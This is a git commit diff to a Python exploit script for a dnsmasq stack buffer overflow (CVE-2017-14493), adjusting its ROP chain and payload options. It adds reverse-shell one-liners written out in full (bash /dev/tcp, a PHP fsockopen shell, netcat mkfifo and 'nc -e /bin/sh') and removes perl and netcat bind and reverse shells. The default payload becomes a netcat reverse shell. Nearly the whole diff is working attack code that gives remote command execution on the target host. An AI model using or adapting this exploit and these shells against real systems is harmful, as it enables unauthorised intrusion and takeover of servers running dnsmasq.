dee169ac3bc4bc7b5d3ba941bf43d0592af37c8c
Ivanov Vladimir <ivanov.vladimir.mail@gmail.com>
2017-10-22 18:09:01 +0300

    Fix Exploit for dnsmasq CVE-2017-14493 (Stack Based overflow)

--- dnsmasploit.py
+++ dnsmasploit.py
@@ -25,22 +25,16 @@ DATA_277x86 = 0x0808c054
 bind_port = str(4444)
 bind_awk = "awk 'BEGIN{s=\"/inet/tcp/" + bind_port + \
            "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
-bind_perl = "perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}" + \
-            "$c=new IO::Socket::INET(LocalPort," + bind_port + \
-            ",Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'"
-bind_nc = "mkfifo /tmp/hdeeiha; (nc -l -p " + bind_port + " ||nc -l " + bind_port + \
-          ")0</tmp/hdeeiha | /bin/sh >/tmp/hdeeiha 2>&1; rm /tmp/hdeeiha"
 
 # Reverse payloads
 reverse_port = str(4444)
 reverse_host = "127.0.0.1"
 reverse_awk = "awk 'BEGIN{s=\"/inet/tcp/0/" + reverse_host + "/" + reverse_port + \
               "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
-reverse_nc = "mkfifo /tmp/kztyan; nc " + reverse_host + " " + reverse_port + \
-             " 0</tmp/kztyan | /bin/sh >/tmp/kztyan 2>&1; rm /tmp/kztyan"
-reverse_perl = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;" + \
-               "}}$c=new IO::Socket::INET(PeerAddr,\"" + reverse_host + ":" + reverse_port + \
-               "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
+reverse_bash = "bash -i >& /dev/tcp/" + reverse_host + "/" + reverse_port + " 0>&1"
+reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+reverse_nc = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + reverse_host + " " + reverse_port + " >/tmp/f"
+reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port
 
 Base = Base()
 Base.print_banner()
@@ -53,16 +47,16 @@ parser.add_argument('-c', '--capacity', help='Set capacity (x86 or x86_64), defa
 parser.add_argument('-v', '--version', help='Set dnsmasq version (2.75, 2.76, 2.77), default=2.77', default='2.77')
 
 parser.add_argument('--interpreter', type=str, help='Set path to interpreter on target, ' +
-                                                    'default="/bin/sh"', default='/bin/sh')
+                                                    'default="/bin/bash"', default='/bin/bash')
 parser.add_argument('--interpreter_arg', type=str, help='Set interpreter argument, default="-c"', default='-c')
 
-parser.add_argument('--payload', help='Set payload (bind_awk, bind_perl, bind_nc, reverse_awk, reverse_perl, ' +
-                                      'reverse_nc), default=bind_awk', default='bind_awk')
+parser.add_argument('--payload', help='Set payload (bind_awk, reverse_awk, reverse_bash, reverse_php, reverse_nc, ' +
+                                      'reverse_nce), default=reverse_nc', default='reverse_nc')
 parser.add_argument('--command', type=str, help='Set command for executing on target')
 
 parser.add_argument('--bind_port', type=int, help='Set bind port, default=4444', default=4444)
 parser.add_argument('--reverse_port', type=int, help='Set reverse port, default=4444', default=4444)
-parser.add_argument('--reverse_host', type=str, help='Set reverse host')
+parser.add_argument('--reverse_host', type=str, help='Set reverse host, default="127.0.0.1"', default="127.0.0.1")
 
 args = parser.parse_args()
 
@@ -96,14 +90,14 @@ if args.command is not None:
     payload = args.command
 else:
     if args.payload == "bind_awk": payload = bind_awk
-    elif args.payload == "bind_perl": payload = bind_perl
-    elif args.payload == "bind_nc": payload = bind_nc
     elif args.payload == "reverse_awk": payload = reverse_awk
-    elif args.payload == "reverse_perl": payload = reverse_perl
+    elif args.payload == "reverse_bash": payload = reverse_bash
+    elif args.payload == "reverse_php": payload = reverse_php
     elif args.payload == "reverse_nc": payload = reverse_nc
+    elif args.payload == "reverse_nce": payload = reverse_nce
     else:
-        print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, bind_perl, bind_nc, " + \
-              "reverse_awk, reverse_perl, reverse_nc!"
+        print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \
+              "reverse_php, reverse_nc, reverse_nce!"
         exit(1)
 
 
@@ -143,7 +137,7 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
                 rop_chain += Base.pack32(POP_EBX_EBP_277x86)    # pop ebx; pop ebp; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(NOPx86)                # NOP (0x90)
+                rop_chain += Base.pack32(DATA_277x86 + 28)      # 0x0808c054 + 28
                 rop_chain += Base.pack32(MOV_EAX_EBX_277x86)    # mov [eax+0x1],ebx; add cl,cl; ret
 
     return rop_chain
@@ -169,12 +163,12 @@ if __name__ == '__main__':
         option_79 += add_string_in_data(payload_addr, payload)
 
         option_79 += Base.pack32(EXECL_277x86)          # execl
-        option_79 += Base.pack32(interpreter_addr)      # "/bin/sh"
-        option_79 += Base.pack32(interpreter_addr)      # "/bin/sh"
+        option_79 += Base.pack32(interpreter_addr)      # "/bin/bash"
+        option_79 += Base.pack32(interpreter_addr)      # "/bin/bash"
         option_79 += Base.pack32(interpreter_arg_addr)  # "-c"
         option_79 += Base.pack32(payload_addr)          # payload
     else:
-        print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " and capacity: " + capacity + \
+        print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " or capacity: " + capacity + \
               " not yet supported!"
         exit(1)
     
